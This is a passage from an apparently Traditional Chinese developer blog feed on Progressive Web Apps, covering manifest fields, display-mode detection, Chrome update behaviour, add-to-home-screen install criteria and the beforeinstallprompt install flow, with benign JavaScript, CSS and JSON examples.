class="punctuation">,</span> <span class="string">&quot;minimal-ui&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;display&quot;</span><span class="punctuation">:</span> <span class="string">&quot;standalone&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ol><li>“window-control-overlay” (蓋掉)</li><li>“minimal-ui”</li><li>“standalone” (回到原來 display 設定的 standalone)</li><li>“minimal-ui”</li><li>“browser”</li></ol><h3 id="start-url"><a href="#start-url" class="headerlink" title="start_url"></a>start_url</h3><p><strong><code>start_url</code> 算是最重要的一個必填屬性</strong>，要告訴瀏覽器當 App 啟動時要顯示什麼畫面，避免 App 因為用戶是從其他頁面加入至主畫面導致啟動頁面是從其他頁面開始。<code>start_url </code> 就是用戶打開的第一個頁面，可以看成產品專用的到達頁面。所以也值得從用戶想要開啟 App 的原因去規劃 <code>start_url</code> 位置。</p><h3 id="shortcuts"><a href="#shortcuts" class="headerlink" title="shortcuts"></a>shortcuts</h3><p><code>shortcuts</code> 相對於 <code>start_url</code> 則可以看成其他常用的子功能，以訂票系統來說就可以分為餘票查詢、時刻查詢等子功能，透過捷徑的配置就能夠讓用戶透過子選單直接開啟 App 並且使用功能，目前的支援度如下</p><ul><li>Android (Chrome 84)</li><li>Windows (Chrome 85 and Edge 85)</li><li>Chrome OS (Chrome 92)</li></ul><ol><li>長按 App 開啟選單</li></ol><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a><br><img src="https://web-dev.imgix.net/image/admin/F4TsJNfRJNJSt2ZpqVAy.png?auto=format&w=845"></p></blockquote><ol start="2"><li>桌面版 App 按右鍵開啟選單</li></ol><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a><br><img src="https://web-dev.imgix.net/image/admin/RoF6k7Aw6WNvaEcsgIcb.png?auto=format&w=845"></p></blockquote><p>如果對捷徑功能有興趣，可以試玩看看底下這個 App:</p><p><a href="https://app-shortcuts.glitch.me/">https://app-shortcuts.glitch.me/</a></p><h2 id="驗證-manifest"><a href="#驗證-manifest" class="headerlink" title="驗證 manifest"></a>驗證 manifest</h2><p>透過開發者工具中的 <code>Application Tab</code> 可以輕鬆的察看是否我們的 manifest 有被正確的使用。</p><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a> &gt; <img src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/FpIOY0Ak6FAA5xMuB9IT.png?auto=format&w=845"></p></blockquote><h2 id="Progressive-Web-App-啟動"><a href="#Progressive-Web-App-啟動" class="headerlink" title="Progressive Web App 啟動"></a>Progressive Web App 啟動</h2><p>要怎麼知道 Web App 是在 PWA 已經被安裝情況下被開啟的，靠 CSS 中有個 <code>display-mode</code>，不管透過 tab 或是安裝的情況下，去測試都可以看得出來。</p><ul><li><code>display-mode</code> 搭配 <code>matchMedia()</code></li><li><code>navigator.standalone</code>: 不支援 <code>matchMedia()</code> 就透過屬性直接判斷</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getPWADisplayMode</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> isStandalone = <span class="variable language_">window</span>.<span class="title function_">matchMedia</span>(<span class="string">&quot;(display-mode: standalone)&quot;</span>).<span class="property">matches</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">referrer</span>.<span class="title function_">startsWith</span>(<span class="string">&quot;android-app://&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;twa&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (navigator.<span class="property">standalone</span> || isStandalone) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;standalone&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;browser&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="偵測-display-mode-改變"><a href="#偵測-display-mode-改變" class="headerlink" title="偵測 display mode 改變"></a>偵測 display mode 改變</h3><p>也是透過 <code>matchMedia()</code> 搭配 <code>change</code> 的事件，但還想不到什麼情境底下會發生。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span></span><br><span class="line">  .<span class="title function_">matchMedia</span>(<span class="string">&quot;(display-mode: standalone)&quot;</span>)</span><br><span class="line">  .<span class="title function_">addEventListener</span>(<span class="string">&quot;change&quot;</span>, <span class="function">(<span class="params">evt</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> displayMode = <span class="string">&quot;browser&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (evt.<span class="property">matches</span>) &#123;</span><br><span class="line">      displayMode = <span class="string">&quot;standalone&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Log display mode change to analytics</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;DISPLAY_MODE_CHANGED&quot;</span>, displayMode);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><h3 id="針對-display-mode-改變-UI"><a href="#針對-display-mode-改變-UI" class="headerlink" title="針對 display mode 改變 UI"></a>針對 display mode 改變 UI</h3><p>最簡單就是透過 CSS 的 media query 條件設定:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@media</span> all <span class="keyword">and</span> (<span class="attribute">display-mode</span>: standalone) &#123;</span><br><span class="line">  <span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Progressive-Web-App-更新機制"><a href="#Progressive-Web-App-更新機制" class="headerlink" title="Progressive Web App 更新機制"></a>Progressive Web App 更新機制</h2><p>當想要更新 App 的名稱或是 Icon 的時候，其實也是透過修改 manifest 配置檔。</p><h3 id="Chrome-桌面版"><a href="#Chrome-桌面版" class="headerlink" title="Chrome 桌面版"></a>Chrome 桌面版</h3><p>以下屬性改變的時候，Chrome 會自動抓取新的 manifest 配置檔, Chrome 會把新的配置暫存，等到所有視窗關閉時會進行更新安裝。當安裝完成時，除了 name, short_name, start_url, icons 以外的欄位都會更新。</p><p>哪幾個欄位會觸發更新?</p><ul><li>display: manifest 的配置、使用者 window&#x2F;browser tab setting 同時存在會以使用者為主</li><li>scope</li><li>shortcuts</li><li>theme_color</li></ul><p>測試 manifest 更新</p><ul><li><code>about://internals/web-app</code></li></ul><h3 id="Chrome-Android-版"><a href="#Chrome-Android-版" class="headerlink" title="Chrome Android 版"></a>Chrome Android 版</h3><p>哪幾個欄位會觸發更新?</p><ul><li>background_color</li><li>display</li><li>orientation</li><li>scope</li><li>shortcuts</li><li>start_url</li><li>theme_color</li><li>web_share_target</li></ul><p>如果 Chrome 無法從伺服器取得更新版的 manifest，會延長到 30 才進行更新確認。</p><p>測試 manifest 更新</p><ul><li><code>about://webapks</code>:　點選 “Update” 按鈕</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App A2HS</title>
      <link href="/2021/09/03/progressive-web-application/pwa-add-to-home-screen-a2hs/"/>
      <url>/2021/09/03/progressive-web-application/pwa-add-to-home-screen-a2hs/</url>
      
        <content type="html"><![CDATA[<h2 id="加入主畫面-Add-to-Home-screen"><a href="#加入主畫面-Add-to-Home-screen" class="headerlink" title="加入主畫面 (Add to Home screen)"></a>加入主畫面 (Add to Home screen)</h2><p>加入主畫面 (Add to Home screen) 常見的縮寫為 A2HS，可以看成是讓使用者將 Web App 進行 “安裝” 的動作，雖然實際上只是加入一個捷徑到桌面上，類似桌面版的我的最愛。</p><p>由於不是 PWA 的網站也可以做到加入主畫面，那 PWA 任務就是要將現有的 A2HS 做漸進式增強，安裝過後除了支援實作快取資源到本機也能夠在 App 管理介面中看到。</p><ul><li><a href="https://support.google.com/chrome/answer/9658361?hl=zh-Hant&co=GENIE.Platform=Desktop&oco=1">Chrome 的使用說明</a></li></ul><h3 id="為什麼需要加入主畫面-A2HS"><a href="#為什麼需要加入主畫面-A2HS" class="headerlink" title="為什麼需要加入主畫面 (A2HS)?"></a>為什麼需要加入主畫面 (A2HS)?</h3><p>A2HS 是 Progressive Web App 設計理念的其中一部份，經過 “安裝” 這個動作讓 web apps 也能像 native app 有類似的使用者體驗。</p><p>在加入主畫面後，使用者就可以透過點擊主畫面上的 icon 直接去使用 Web App，PWA 的相關支援目前在各大平台的支援程度都在逐漸提高中，不過漸進式增強功能在各平台都有各自需要注意的地方。</p><h2 id="怎麼使用加入主畫面-Add-to-Home-screen"><a href="#怎麼使用加入主畫面-Add-to-Home-screen" class="headerlink" title="怎麼使用加入主畫面 (Add to Home screen)?"></a>怎麼使用加入主畫面 (Add to Home screen)?</h2><p>透過瀏覽器打開後，可以注意網址欄會多了一個可以按的按鈕，依各家瀏覽器不同會有不同的樣貌，這個按鈕就是加入主畫面的功能按鈕。</p><blockquote><p>網址列的加入至主畫面 (圖片來源: <a href="https://developer.mozilla.org/">https://developer.mozilla.org</a>)<br><img src="https://developer.mozilla.org/en-US/docs/Web/Progressive_web_apps/Add_to_home_screen/add-to-home-screen-icon.png" alt="加入至主畫面"></p></blockquote><p>在按下加入至主畫面後或第一次載入網頁時 (Android 8 以上) 依照各家瀏覽器實作不同，大多會有一個確認的視窗，按下後就完成了這個 “安裝” 的動作。</p><blockquote><p>確認要加入至主畫面 (圖片來源: <a href="https://developer.mozilla.org/">https://developer.mozilla.org</a>)<br><img src="https://developer.mozilla.org/en-US/docs/Web/Progressive_web_apps/Add_to_home_screen/chrome-a2hs-banner.png" alt="確認要加入至主畫面"></p></blockquote><p>MDN 提供了一個簡單輪播圖片的範例，可以直接用手機打開來看，連結如下:</p><p><a href="https://mdn.github.io/pwa-examples/a2hs/">https://mdn.github.io/pwa-examples/a2hs/</a></p><p>雖然網站很簡單，但其中也實作了 service worker 來快取資源讓網站在安裝後能夠離線瀏覽。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&quot;install&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  e.<span class="title function_">waitUntil</span>(</span><br><span class="line">    caches</span><br><span class="line">      .<span class="title function_">open</span>(<span class="string">&quot;fox-store&quot;</span>)</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function">(<span class="params">cache</span>) =&gt;</span></span><br><span class="line">        cache.<span class="title function_">addAll</span>([</span><br><span class="line">          <span class="string">&quot;/pwa-examples/a2hs/&quot;</span>,</span><br><span class="line">          <span class="string">&quot;/pwa-examples/a2hs/index.html&quot;</span>,</span><br><span class="line">          <span class="string">&quot;/pwa-examples/a2hs/index.js&quot;</span>,</span><br><span class="line">          <span class="string">&quot;/pwa-examples/a2hs/style.css&quot;</span>,</span><br><span class="line">          <span class="string">&quot;/pwa-examples/a2hs/images/fox1.jpg&quot;</span>,</span><br><span class="line">          <span class="string">&quot;/pwa-examples/a2hs/images/fox2.jpg&quot;</span>,</span><br><span class="line">          <span class="string">&quot;/pwa-examples/a2hs/images/fox3.jpg&quot;</span>,</span><br><span class="line">          <span class="string">&quot;/pwa-examples/a2hs/images/fox4.jpg&quot;</span>,</span><br><span class="line">        ])</span><br><span class="line">      )</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="目前哪些瀏覽器支援-A2HS"><a href="#目前哪些瀏覽器支援-A2HS" class="headerlink" title="目前哪些瀏覽器支援 A2HS?"></a>目前哪些瀏覽器支援 A2HS?</h3><p>加入主畫面這個功能幾乎是全面支援，除了:</p><ul><li>iOS webview 不支援</li><li>Chromium desktop 部分支援</li><li>Firefox Mobile v58 後支援</li></ul><p>想要了解更多詳細狀況，可以參考 caniuse.com，連結如下:</p><p><a href="https://caniuse.com/web-app-manifest">https://caniuse.com/web-app-manifest</a></p><h3 id="加入主畫面-A2HS-不存在哪些增強功能"><a href="#加入主畫面-A2HS-不存在哪些增強功能" class="headerlink" title="加入主畫面 (A2HS) 不存在哪些增強功能?"></a>加入主畫面 (A2HS) 不存在哪些增強功能?</h3><p>加入主畫面的過程只是讓 Web App 更方便存取，並沒有將 App 的資源下載或快取，所以並無法讓 Web App 做到離線使用。</p><p>離線使用的功能必須額外搭配 Service Worker API 來處理、儲存資料和資源，像是透過 Web storage 或 IndexedDB 都是不錯的解決方案。</p><p>在實作完相關快取機制後，記得要註冊後才可以使用:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;serviceWorker&quot;</span> <span class="keyword">in</span> navigator) &#123;</span><br><span class="line">  navigator.<span class="property">serviceWorker</span>.<span class="title function_">register</span>(<span class="string">&quot;/pwa-examples/a2hs/sw.js&quot;</span>).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Service Worker Registered&quot;</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="怎麼讓-Web-App-有-PWA-的增強功能-A2HS-ready"><a href="#怎麼讓-Web-App-有-PWA-的增強功能-A2HS-ready" class="headerlink" title="怎麼讓 Web App 有 PWA 的增強功能 (A2HS-ready)?"></a>怎麼讓 Web App 有 PWA 的增強功能 (A2HS-ready)?</h2><p>各家的瀏覽器其實都有相關的 <a href="https://web.dev/install-criteria/">“安裝前的審核標準”</a>，只有在滿足相關條件後，才會讓瀏覽器支援 “漸進式增強的安裝”，而非單純的加入捷徑到主畫面，底下列出 Firefox 和 Chrome 的標準，也附上各平台的相關標準參考連結:</p><ul><li><a href="https://docs.microsoft.com/en-us/microsoft-edge/progressive-web-apps#requirements">Edge</a></li><li><a href="https://developer.mozilla.org/en-US/Apps/Progressive/Add_to_home_screen#How_do_you_make_an_app_A2HS-ready">Firefox</a></li><li><a href="https://dev.opera.com/articles/installable-web-apps/">Opera</a></li><li><a href="https://hub.samsunginter.net/docs/ambient-badging/">Samsung Internet</a></li></ul><h3 id="Firefox-Install-criteria"><a href="#Firefox-Install-criteria" class="headerlink" title="Firefox Install criteria"></a>Firefox Install criteria</h3><ol><li>HTTPS</li><li>manifest 配置檔必填欄位都有填，且有在 HTML head 引入</li><li>有 icon 的圖片，提供在主畫面中顯示用</li></ol><h3 id="Chrome-Install-criteria"><a href="#Chrome-Install-criteria" class="headerlink" title="Chrome Install criteria"></a>Chrome Install criteria</h3><ol><li>HTTPS</li><li>web App 沒有被安裝過</li><li>Meets a user engagement heuristic (使用者在這個網域有互動超過 30 秒)</li><li>有註冊 service worker 且搭配 <code>fetch</code> handler</li><li>manifest 配置檔須包含<ul><li><code>short_name</code> 或 <code>name</code></li><li><code>icons</code> 包含 192px 跟 512px</li><li><code>start_url</code></li><li><code>display</code> 要填 <code>fullscreen</code>、<code>standalone</code>、<code>minimal-ui</code></li><li><code>prefer_related_applications</code> 不需要，或是給 <code>false</code></li></ul></li></ol><h3 id="Manifest"><a href="#Manifest" class="headerlink" title="Manifest"></a>Manifest</h3><p>這其中有一個關鍵就是 <code>manifest</code> 這個配置檔，會是讓瀏覽器辨識是否為 PWA 的一個關鍵，推薦的命名規則有兩種</p><ul><li><code>somefilename.webmanifest</code></li><li><code>manifest.json</code></li></ul><p>在加入這個檔案後記得在 <code>&lt;head&gt;</code> 中引入 <code>&lt;link rel=&quot;manifest&quot; href=&quot;manifest.webmanifest&quot;&gt;</code></p><p>那要支援 A2HS 有幾個必填欄位如下:</p><ul><li><code>background_color</code>: 在加入主畫面後，啟動時 splash screen 的背景主視覺，在還沒安裝前的網址列也會改變顏色</li><li><code>display</code>: 定義 App 開啟後的顯示方式目前有三種，各有細微差異 <code>fullscreen</code>、<code>standalone</code>、<code>minimal-ui</code></li><li><code>icons</code>: 主畫面或是任務切換時顯示</li><li><code>name</code>&#x2F;<code>short_name</code>: 安裝後的 App 名稱 <code>short_name</code> 會用在顯示上有限制的地方</li><li><code>start_url</code>: App 開啟預設頁，須注意為相對路徑跟 manifest 位置相關，有填 Chrome 才會跳提示</li></ul><p>MDN 提供的完整範例如下:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;background_color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;purple&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Shows random fox pictures. Hey, at least it isn&#x27;t cats.&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;display&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fullscreen&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;icons&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;icon/fox-icon.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192x192&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/png&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Awesome fox pictures&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;short_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Foxes&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;start_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/pwa-examples/a2hs/index.html&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>恭喜!!! 看到這裡就可以發現，其實很快就可以很快地做出一個初階版的 PWA 了，所以其實 PWA 對網頁開發者來說，幾乎可以說是只有優點沒有太多缺點。</p><h2 id="Promoting-installation-推薦安裝提示"><a href="#Promoting-installation-推薦安裝提示" class="headerlink" title="Promoting installation 推薦安裝提示"></a>Promoting installation 推薦安裝提示</h2><p>當我們的 Progressive Web App 滿足了<a href="https://web.dev/install-criteria/">安裝前的審核標準</a>，瀏覽器就會觸發 <code>beforeinstallprompt</code> 這個事件，當事件被觸發後，才能夠進行後續的安裝過程。</p><p>所以在實作安裝流程上會分成下面三個步驟:</p><ol><li>監聽 <code>beforeinstallprompt</code> 這個事件</li><li>觸發後記得把事件存起來，後續在安裝的流程上會需要</li><li>告知使用者，這個 App 可以被安裝，並提供按鈕讓使用者繼續後續的相關流程</li></ol><h2 id="beforeinstallprompt-程式解析"><a href="#beforeinstallprompt-程式解析" class="headerlink" title="beforeinstallprompt 程式解析"></a>beforeinstallprompt 程式解析</h2><p>透過程式的流程來觸發相關安裝流程，不管按鈕打算放在哪都要先隱藏，因為 PWA 在還沒達到 A2HS 的<a href="https://web.dev/install-criteria/">安裝前的審核標準</a>前並無法被安裝。</p><p>安裝流程主要會有兩種</p><ol><li>透過自訂按鈕安裝流程</li><li>透過網址列或是瀏覽器協助安裝</li></ol><h3 id="前置準備"><a href="#前置準備" class="headerlink" title="前置準備"></a>前置準備</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;add-button&quot;</span>&gt;</span>Add to home screen<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> deferredPrompt;</span><br><span class="line"><span class="keyword">const</span> addBtn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.add-button&quot;</span>);</span><br><span class="line">addBtn.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="自訂安裝按鈕"><a href="#自訂安裝按鈕" class="headerlink" title="自訂安裝按鈕"></a>自訂安裝按鈕</h3><ol><li>宣告 <code>deferredPrompt</code> 變數儲存事件</li><li>收到 beforeinstallprompt 觸發後要 <code>e.preventDefault();</code>，因為 Chrome 67 以前的版本會自動觸發內建提示視窗</li><li>要記得把事件存起來，後續在安裝的流程上會需要</li><li>讓 “安裝按鈕” 顯示</li><li>點選後 “安裝按鈕” 隱藏 (也可以停用)</li><li>點選按鈕後才觸發提示視窗</li><li>等待使用者確認或拒絕</li><li>從 userChoice 的結果判斷是否安裝成功</li><li><code>deferredPrompt</code> 用過就不能再用了</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://github.com/mdn/pwa-examples/blob/master/a2hs/index.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 宣告變數儲存事件</span></span><br><span class="line"><span class="keyword">let</span> deferredPrompt;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;beforeinstallprompt&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 2. 停用 Chrome 67 前的公版提示視窗</span></span><br><span class="line">  e.<span class="title function_">preventDefault</span>();</span><br><span class="line">  <span class="comment">// 3. 記得把事件存起來，後續在安裝的流程上會需要</span></span><br><span class="line">  deferredPrompt = e;</span><br><span class="line">  <span class="comment">// 4. 讓 &quot;安裝按鈕&quot; 顯示</span></span><br><span class="line">  addBtn.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;block&quot;</span>;</span><br><span class="line"></span><br><span class="line">  addBtn.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 5. 點選後 &quot;安裝按鈕&quot; 隱藏 (也可以停用)</span></span><br><span class="line">    addBtn.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span><br><span class="line">    <span class="comment">// 6. 點選按鈕後才觸發提示視窗</span></span><br><span class="line">    deferredPrompt.<span class="title function_">prompt</span>();</span><br><span class="line">    <span class="comment">// 7. 等待使用者確認或拒絕</span></span><br><span class="line">    deferredPrompt.<span class="property">userChoice</span>.<span class="title function_">then</span>(<span class="function">(<span class="params">choiceResult</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 8. 從 userChoice 的結果判斷是否安裝成功</span></span><br><span class="line">      <span class="keyword">if</span> (choiceResult.<span class="property">outcome</span> === <span class="string">&quot;accepted&quot;</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;User accepted the A2HS prompt&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;User dismissed the A2HS prompt&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 9. 用過就不能再用了</span></span><br><span class="line">      deferredPrompt = <span class="literal">null</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="透過網址列或瀏覽器安裝"><a href="#透過網址列或瀏覽器安裝" class="headerlink" title="透過網址列或瀏覽器安裝"></a>透過網址列或瀏覽器安裝</h3><p>透過網址列、瀏覽器元件自動的提示、瀏覽器中的選單進行安裝的話，開發者無法知道是否 App 已經被安裝，所以需要透過 <code>appinstalled</code> 這個事件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;appinstalled&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// &quot;安裝按鈕&quot; 隱藏 (也可以停用)</span></span><br><span class="line">  addBtn.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span><br><span class="line">  <span class="comment">// 用過就不能再用了</span></span><br><span class="line">  deferredPrompt = <span class="literal">null</span>;</span><br><span class="line">  <span class="comment">// 安裝成功</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;PWA was installed&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Promoting-推薦介面設計模式"><a href="#Promoting-推薦介面設計模式" class="headerlink" title="Promoting 推薦介面設計模式"></a>Promoting 推薦介面設計模式</h2><p>PWA 安裝的流程介面設計上 Google 有幾個建議</p><ul><li>只在滿足<a href="https://web.dev/install-criteria/">安裝前的審核標準</a>並觸發 <code>beforeinstallprompt</code> 才顯示</li><li>讓安裝建議的提示和原來的使用者歷程分開，減少影響相關的互動與轉化</li><li>提供並且記住使用者拒絕或延後安裝的選擇結果，只在使用者狀態改變時再次提示，像是登入後或著是完成一次購買時</li><li>可以運用各種介面設計模式來提示安裝，但盡量不要放太多</li></ul><p>底下圖片皆取自於 <a href="https://web.dev/">https://web.dev/</a></p><h3 id="瀏覽器自動提示"><a href="#瀏覽器自動提示" class="headerlink" title="瀏覽器自動提示"></a>瀏覽器自動提示</h3><p>當 PWA 滿足<a href="https://web.dev/install-criteria/">安裝前的審核標準</a>時，大部分瀏覽器會自動地跳出可以被安裝的提示。</p><p>桌面版本提示:</p><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a> &gt; <img alt="" src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/zIfRss5zOrZ49c4VdJ52.png?auto=format&w=845"></p></blockquote><p>手機版本提示:</p><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a> &gt; <img alt="" src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/kRjcsxlHDZa9Nqg2Fpei.png?auto=format&w=845"></p></blockquote><h3 id="簡易安裝按鈕"><a href="#簡易安裝按鈕" class="headerlink" title="簡易安裝按鈕"></a>簡易安裝按鈕</h3><p>最簡單的 UX 就是透過一個安裝按鈕來提示，簡易安裝按鈕。</p><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a> &gt; <img alt="" src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/kv0x9hxZ0TLVaIiP4Bqx.png?auto=format&w=845"></p></blockquote><h3 id="固定的-Header-提示"><a href="#固定的-Header-提示" class="headerlink" title="固定的 Header 提示"></a>固定的 Header 提示</h3><p>像是購物網站或是論壇入口，就蠻適合將安裝按鈕提示放在固定的 Header 